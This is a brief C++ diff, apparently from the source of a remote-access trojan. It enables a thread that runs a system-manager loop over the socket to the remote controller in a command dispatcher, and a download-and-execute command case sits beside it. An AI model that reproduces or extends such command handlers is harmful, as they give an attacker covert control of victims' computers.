@@ -97,8 +97,14 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		break;
 
 	case COMMAND_SYSTEM: 
-		//m_hThread[m_nThreadCount++] = DoCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
-		//	(LPVOID)m_pClient->m_Socket, 0, NULL);
+		m_hThread[m_nThreadCount++] = DoCreateThread(
+			NULL, 
+			0, 
+			(LPTHREAD_START_ROUTINE)Loop_SystemManager,
+			(LPVOID)m_pClient->m_Socket, 
+			0, 
+			NULL,
+			false);
 		break;
 
 	case COMMAND_DOWN_EXEC: // ЯТдиеп
